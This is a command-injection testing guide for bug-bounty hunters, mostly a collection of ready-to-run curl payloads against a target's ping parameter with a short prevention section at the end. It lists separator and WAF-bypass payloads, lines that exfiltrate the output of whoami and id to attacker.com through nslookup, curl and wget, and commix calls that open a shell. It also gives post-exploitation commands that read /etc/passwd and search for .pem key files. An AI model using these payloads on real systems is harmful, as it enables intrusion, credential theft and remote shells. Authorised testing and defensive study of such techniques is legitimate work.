# Command Injection (OS Command Injection)

> Comprehensive command injection testing methodology for bug bounty hunters & penetration testers (2025–2026)

## Overview

Command injection (OS command injection or shell injection) occurs when an application calls OS shell commands using unsanitized user input, allowing attackers to execute arbitrary system commands (often leading to RCE). This guide covers modern command injection testing methodology, tools, and bypass techniques based on OWASP OS Command Injection Defense Cheat Sheet, PortSwigger OS Command Injection, and recent WAF bypass trends.

## Command Injection Types

| Type | Description | Testing Focus |
|------|-------------|---------------|
| **Direct command injection** | Command output appears in application response | Visible output detection |
| **Blind command injection** | No direct output; must use time delays or OOB techniques | Time delays, DNS/HTTP callbacks |
| **Argument injection** | User input passed as arguments to system commands | Parameter manipulation, argument pollution |

## Methodology

### 1. Target & Input Identification
- **Common vulnerable features:** Ping/traceroute tools (`?ip=`, `?host=`), DNS lookup/nslookup/dig, file conversion/processing (PDF to image, ffmpeg wrappers), network diagnostics (netstat, whois), backup/export scripts, log analysis/grep-like search
- **Vulnerable parameter patterns:** `cmd=`, `command=`, `exec=`, `system=`, `bash=`, `sh=`, `ping=`, `nslookup=`, `netstat=`, `traceroute=`, `host=`, `ip=`, `domain=`, `url=`, `filename=`, `convert=`, `process=`, `run=`, `script=`, `query=`, `os.`, `runtime.`, `process.`, `subprocess.`, `pipe=`
- **Additional input sources:** Headers (`User-Agent`, `Referer` if logged/executed), cookies (rare), JSON/API fields
- **Programming language functions:** `system()`, `exec()`, `passthru()`, `shell_exec()`, `popen()`, `proc_open()` (PHP), `os.system()`, `subprocess` (Python), `Runtime.getRuntime().exec()` (Java)

### 2. Tool Installation & Setup

```bash
# Install command injection testing tools
pip3 install commix                                     # Automated command injection tool
go install github.com/projectdiscovery/httpx/cmd/httpx@latest  # HTTP toolkit
go install github.com/tomnomnom/qsreplace@latest       # Query string replacement
go install github.com/ffuf/ffuf@latest                 # Fuzzing for parameter discovery

# Install payload lists
git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git ~/PayloadsAllTheThings
git clone https://github.com/danielmiessler/SecLists.git ~/SecLists
```

### 3. Basic Injection Probes

```bash
# Test with common command separators
curl -s "https://target.com/ping?ip=127.0.0.1;whoami"
curl -s "https://target.com/ping?ip=127.0.0.1|whoami"
curl -s "https://target.com/ping?ip=127.0.0.1&&whoami"
curl -s "https://target.com/ping?ip=127.0.0.1||whoami"
curl -s "https://target.com/ping?ip=127.0.0.1&whoami"
curl -s "https://target.com/ping?ip=127.0.0.1\`whoami\`"
curl -s "https://target.com/ping?ip=127.0.0.1\$(whoami)"

# Test with URL encoding
curl -s "https://target.com/ping?ip=127.0.0.1%3Bwhoami"
curl -s "https://target.com/ping?ip=127.0.0.1%26%26whoami"
curl -s "https://target.com/ping?ip=127.0.0.1%7Cwhoami"

# Test with newline injection
curl -s "https://target.com/ping?ip=127.0.0.1%0Awhoami"
curl -s "https://target.com/ping?ip=127.0.0.1%0D%0Awhoami"
```

### 4. Time-Based Detection (Blind Injection)

```bash
# Linux/Unix time delays
curl -s "https://target.com/ping?ip=127.0.0.1;sleep 5" --max-time 10
curl -s "https://target.com/ping?ip=127.0.0.1&&sleep 5" --max-time 10
curl -s "https://target.com/ping?ip=127.0.0.1|ping -c 10 127.0.0.1" --max-time 15

# Windows time delays
curl -s "https://target.com/ping?ip=127.0.0.1&ping -n 6 127.0.0.1>nul" --max-time 10
curl -s "https://target.com/ping?ip=127.0.0.1&&timeout /t 5 >nul" --max-time 10

# Conditional time delays
curl -s "https://target.com/ping?ip=127.0.0.1&&sleep 5||sleep 1" --max-time 10
```

### 5. Out-of-Band (OOB) Detection

```bash
# DNS exfiltration
curl -s "https://target.com/ping?ip=127.0.0.1;nslookup \$(whoami).attacker.com"
curl -s "https://target.com/ping?ip=127.0.0.1&&nslookup \$(hostname).attacker.com"

# HTTP exfiltration
curl -s "https://target.com/ping?ip=127.0.0.1;curl http://attacker.com/\$(whoami)"
curl -s "https://target.com/ping?ip=127.0.0.1&&wget http://attacker.com/\$(id)"

# Using interactive OAST tools (Burp Collaborator, interact.sh)
curl -s "https://target.com/ping?ip=127.0.0.1;curl https://YOUR-SUBDOMAIN.oastify.com"
curl -s "https://target.com/ping?ip=127.0.0.1;nslookup YOUR-SUBDOMAIN.oastify.com"
```

### 6. WAF Bypass & Advanced Techniques (2025–2026 Trends)

```bash
# No-space / encoding tricks
curl -s "https://target.com/ping?ip=127.0.0.1;whoami"
curl -s "https://target.com/ping?ip=127.0.0.1\${IFS}whoami"
curl -s "https://target.com/ping?ip=127.0.0.1%09whoami"  # Tab
curl -s "https://target.com/ping?ip=127.0.0.1%20whoami"  # Space
curl -s "https://target.com/ping?ip=127.0.0.1\${PATH:0:1}tmp\${PATH:0:1}test.txt"  # /tmp/test.txt

# Case & keyword variation
curl -s "https://target.com/ping?ip=127.0.0.1;WhOaMi"
curl -s "https://target.com/ping?ip=127.0.0.1;CaT /etc/passwd"

# Alternative separators / syntax
curl -s "https://target.com/ping?ip=127.0.0.1%0awhoami"  # Newline
curl -s "https://target.com/ping?ip=127.0.0.1<<<whoami"   # Here-string
curl -s "https://target.com/ping?ip=127.0.0.1< <(whoami)" # Process substitution

# Obfuscation techniques
curl -s "https://target.com/ping?ip=127.0.0.1;\$(base64 -d <<< d2hvYW1pCg==)"  # whoami base64
curl -s "https://target.com/ping?ip=127.0.0.1;\$(rev emiawoh)"                  # whoami reversed
curl -s "https://target.com/ping?ip=127.0.0.1;who\"am\"i"                      # Quote splitting

# Windows-specific bypasses
curl -s "https://target.com/ping?ip=127.0.0.1&whoami"
curl -s "https://target.com/ping?ip=127.0.0.1|dir /b"
curl -s "https://target.com/ping?ip=127.0.0.1%SystemRoot%\\system32\\whoami.exe"
curl -s "https://target.com/ping?ip=127.0.0.1%26powershell -c \"whoami\""

# Hex encoding
curl -s "https://target.com/ping?ip=127.0.0.1\x3bwhoami"
curl -s "https://target.com/ping?ip=127.0.0.1%5cx3bwhoami"
```

### 7. Automated Testing with Commix

```bash
# Basic scan
commix -u "https://target.com/ping?ip=127.0.0.1" --batch

# Advanced scan with tampering
commix -u "https://target.com/ping?ip=127.0.0.1" --batch --level=3 --tamper="space2comment,randomcase"

# Batch scanning from file
cat urls.txt | xargs -I@ commix -u @ --batch --level=2

# Time-based detection
commix -u "https://target.com/ping?ip=127.0.0.1" --batch --time-sec=5

# OOB detection
commix -u "https://target.com/ping?ip=127.0.0.1" --batch --oob=http --oob-server=attacker.com

# OS fingerprinting
commix -u "https://target.com/ping?ip=127.0.0.1" --batch --os-cmd="uname -a"

# Shell access
commix -u "https://target.com/ping?ip=127.0.0.1" --batch --shell
```

### 8. Manual Testing with Curl & Custom Payloads

```bash
# Test for Linux/Unix command injection
for payload in ";whoami" "|whoami" "&&whoami" "||whoami" "\`whoami\`" "\$(whoami)"; do
  echo "Testing payload: $payload"
  curl -s "https://target.com/ping?ip=127.0.0.1$payload" | grep -i "root\|www-data\|uid\|gid\|user" && echo "VULNERABLE!"
done

# Test for Windows command injection
for payload in "&whoami" "|whoami" "&&whoami" "||whoami" "%26whoami"; do
  echo "Testing payload: $payload"
  curl -s "https://target.com/ping?ip=127.0.0.1$payload" | grep -i "administrator\|system\|user" && echo "VULNERABLE!"
done

# Test with multiple parameter positions
curl -s "https://target.com/ping?ip=127.0.0.1&domain=example.com;whoami"
curl -s "https://target.com/ping?ip=127.0.0.1;whoami&domain=example.com"
curl -s "https://target.com/ping?ip=127.0.0.1&domain=example.com&host=test;whoami"
```

### 9. Payload Lists & Wordlists

```bash
# Use PayloadsAllTheThings command injection payloads
cat ~/PayloadsAllTheThings/Command\ Injection/Command-Injection.md | grep -E "^\s*\`" | sed "s/\`//g" > cmd-payloads.txt

# Use SecLists command injection payloads
cat ~/SecLists/Fuzzing/command-injection.txt > seclists-cmd.txt

# Generate custom payloads
for cmd in "whoami" "id" "uname -a" "hostname" "pwd" "ls -la" "cat /etc/passwd"; do
  for sep in ";" "|" "&" "&&" "||" "\`" "\$("; do
    echo "$sep$cmd"
    echo "$sep $cmd"
    echo "$sep$cmd #"
    echo "$sep$cmd --"
  done
done > custom-cmd-payloads.txt
```

### 10. Detection & Verification

- **Direct output:** Command output appears in response (e.g., `www-data`, `uid=1000`)
- **Error messages:** Shell errors, command not found, permission denied
- **Time delays:** Response time increases significantly (>4-5 seconds)
- **OOB interaction:** DNS/HTTP requests received on your server
- **Response differences:** Different content length, status codes, or error messages

### 11. Post-Exploitation Commands

```bash
# Linux/Unix post-exploitation
curl -s "https://target.com/ping?ip=127.0.0.1;id"
curl -s "https://target.com/ping?ip=127.0.0.1;uname -a"
curl -s "https://target.com/ping?ip=127.0.0.1;cat /etc/passwd"
curl -s "https://target.com/ping?ip=127.0.0.1;ls -la /"
curl -s "https://target.com/ping?ip=127.0.0.1;ps aux"
curl -s "https://target.com/ping?ip=127.0.0.1;netstat -antp"
curl -s "https://target.com/ping?ip=127.0.0.1;find / -type f -name '*.pem' 2>/dev/null"

# Windows post-exploitation
curl -s "https://target.com/ping?ip=127.0.0.1&whoami"
curl -s "https://target.com/ping?ip=127.0.0.1&systeminfo"
curl -s "https://target.com/ping?ip=127.0.0.1&type C:\\Windows\\win.ini"
curl -s "https://target.com/ping?ip=127.0.0.1&dir C:\\"
curl -s "https://target.com/ping?ip=127.0.0.1&netstat -ano"
curl -s "https://target.com/ping?ip=127.0.0.1&tasklist"
```

## Prevention & Defense (Developer Perspective)

### Primary Defenses
1. **Avoid OS commands entirely:** Use safe APIs/libraries instead of shell commands
2. **Parameterized/structured input:** Whitelist allowed values for command arguments
3. **Input validation/sanitization:** Strict allow-list over blacklist, validate against expected patterns
4. **Least privilege:** Application process should run with minimal permissions
5. **Escape special characters:** If shell commands are unavoidable, use proper escaping functions

### Language-Specific Protection
- **PHP:** `escapeshellarg()`, `escapeshellcmd()` (prefer `escapeshellarg()`)
- **Python:** `subprocess.run()` with `shell=False`, use list of arguments instead of string
- **Java:** `ProcessBuilder` with separate command and arguments, not `Runtime.exec()` with string concatenation
- **Node.js:** `child_process.spawn()` with array arguments, not `exec()` with string concatenation
- **C/C++:** Avoid `system()`, use `exec()` family with separate arguments

### Additional Defenses
- **Web Application Firewall (WAF):** As defense-in-depth layer, not primary protection
- **Input validation:** Type, length, format, range validation before passing to commands
- **Output encoding:** Encode command output before displaying in web interfaces
- **Regular audits:** Review code for command execution functions, test with security scanners

### Security Headers & Configuration
```http
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

## References

- **PortSwigger OS Command Injection:** https://portswigger.net/web-security/os-command-injection
- **OWASP OS Command Injection Defense Cheat Sheet:** https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html
- **PayloadsAllTheThings – Command Injection:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
- **Commix Documentation:** https://github.com/commixproject/commix
- **SecLists Command Injection Payloads:** https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/command-injection
- **Web-Vulnerability-Testing-Checklist Command-Injection.md:** ../Web-Vulnerability-Testing-Checklist/Command-Injection.md

## Tool References
- **Commix:** https://github.com/commixproject/commix
- **Burp Suite:** https://portswigger.net/burp
- **OWASP ZAP:** https://www.zaproxy.org/
- **FFuf:** https://github.com/ffuf/ffuf
- **Httpx:** https://github.com/projectdiscovery/httpx

---

**Happy (ethical) hunting — command injection bugs often lead to full RCE and significant bounties in bug bounty programs!**
